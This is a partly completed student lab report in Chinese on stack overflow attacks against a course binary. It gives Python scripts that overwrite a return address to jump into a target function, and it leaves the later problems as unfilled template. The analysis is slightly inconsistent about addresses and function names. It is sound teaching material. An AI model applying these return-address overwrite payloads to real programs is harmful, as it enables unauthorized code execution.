# 栈溢出攻击实验

姓名：朱照宇
学号：2024201532

## 题目解决思路

### Problem 1: 
- **分析**：通过反编译工具可以看到`“Yes!I like ICS!”`这句话在在`func1`的`0x402004`处，而在`main`函数中我们看到调用了`func`函数，我们很自然想到将`func`函数的返回地址改为`func1`的起始地址`0x401216`。通过对`func1`的分析得，其使用了8byte的buffer,旧的`%ebp`占8个byte，故我们用A填充这16个字节，然后将之后的返回地址改成`0x402004`。
- **解决方案**：
```python
padding = b"A" * 16
func1_address = b"\x16\x12\x40\x00\x00\x00\x00\x00" 
payload = padding+ func1_address
with open("ans1.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans1.txt")
```
- **结果**：
![p1](a1.png)

### Problem 2:
- **分析**：`“Yes!I like ICS!”`这句话在在`func1`的`0xde8(%rip)`处，其他步骤都相同，但我们不能和Problem1一样直接传入`func2`的起始地址，因为func中有一个判断语句`cmpl $0x3f8,-0x4(%rbp)`,如果不满足，会直接打印`"I think that you should give me the rig"`。所以我们要直接将返回地址填成`0x40124c`来避免判断语句，直接跳到打印目标语句处。
- **解决方案**：
```python3
padding = b"A" * 16
func1_address = b"\x4c\x12\x40\x00\x00\x00\x00\x00"  
payload = padding+ func1_address
with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans2.txt")
```
- **结果**：
![a2](a2.png)

### Problem 3: 
- **分析**：...
- **解决方案**：payload是什么，即你的python代码or其他能体现你payload信息的代码/图片
- **结果**：附上图片

### Problem 4: 
- **分析**：体现canary的保护机制是什么
- **解决方案**：payload是什么，即你的python代码or其他能体现你payload信息的代码/图片
- **结果**：附上图片

## 思考与总结



## 参考资料

列出在准备报告过程中参考的所有文献、网站或其他资源，确保引用格式正确。
